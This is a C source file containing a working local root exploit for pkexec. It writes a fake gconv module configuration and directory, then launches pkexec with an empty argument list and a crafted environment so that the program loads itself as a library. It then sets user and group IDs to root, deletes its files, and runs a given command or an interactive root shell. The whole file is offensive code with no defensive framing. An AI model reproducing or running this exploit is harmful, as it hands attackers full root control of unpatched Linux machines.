#define _XOPEN_SOURCE 700
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <ftw.h>

#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/signal.h>

// 64-bit library
#ifdef __amd64__
const char service_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";
#endif
// 32-bit library
#ifdef __i386__
const char service_interp[] __attribute__((section(".interp"))) = "/lib/ld-linux.so.2";
#endif

int unlink_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf)
{
    int rv = remove(fpath);

    if (rv)
        perror(fpath);

    return rv;
}

int rmrf(char *path)
{
    return nftw(path, unlink_cb, 64, FTW_DEPTH | FTW_PHYS);
}

void entry()
{
    int res;
    FILE *fp;
    char buf[PATH_MAX];
    int pipefd[2];
    char *cmd;
    int argc;
    char **argv;
    register unsigned long *rbp asm ("rbp");

    argc = *(int *)(rbp+1);
    argv = (char **)rbp+2;

    res = mkdir("XDEATH=.", 0777);
    if (res == -1 && errno != EEXIST)
    {
        perror("Failed to create directory");
        _exit(1);
    }

    res = creat("XDEATH=./.xdeath", 0777);

    res = mkdir(".xdeath", 0777);

    fp = fopen(".xdeath/xdeath-modules", "w+");
    if (fp == NULL)
    {
        perror("Failed to open output file");
        _exit(1);
    }
    if (fputs("module UTF-8// PKEXEC// pkexec 2", fp) < 0)
    {
        perror("Failed to write config");
        _exit(1);
    }
    fclose(fp);

    buf[readlink("/proc/self/exe", buf, sizeof(buf))] = 0;
    res = symlink(buf, ".xdeath/xdeath.so");
    if (res == -1)
    {
        perror("Failed to copy file");
        _exit(1);
    }
    
    pipe(pipefd);
    if (fork() == 0)
    {
        close(pipefd[1]);

        buf[read(pipefd[0], buf, sizeof(buf)-1)] = 0;
        if (strstr(buf, "pkexec --version") == buf) {
            // Cleanup for situations where the exploit didn't work
            puts("Exploit failed. Target is most likely patched.");

            rmrf("XDEATH=.");
            rmrf(".xdeath");
        }

        _exit(0);
    }

    close(pipefd[0]);

    dup2(pipefd[1], 2);
    close(pipefd[1]);

    cmd = NULL;
    if (argc > 1) {
        cmd = memcpy(argv[1]-4, "CMD=", 4);
    }
    char *args[] = {NULL};
    char *env[] = {".xdeath", "PATH=XDEATH=.", "CHARSET=pkexec", "SHELL=pkexec", cmd, NULL};
    execve("/usr/bin/pkexec", args, env);

    // In case pkexec is not in /usr/bin/
    execvpe("pkexec", args, env);

    _exit(0);
    
}

void gconv() {}
void gconv_init()
{
    close(2);
    dup2(1, 2);

    char *cmd = getenv("CMD");

    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    rmrf("XDEATH=.");
    rmrf(".xdeath");

    if (cmd) {
        execve("/bin/sh", (char *[]){"/bin/sh", "-c", cmd, NULL}, NULL);
    } else {
        // Try interactive bash first
        execve("/bin/bash", (char *[]){"-i", NULL}, NULL);

        // In case interactive bash was not possible
        execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
    }
    _exit(0);
}
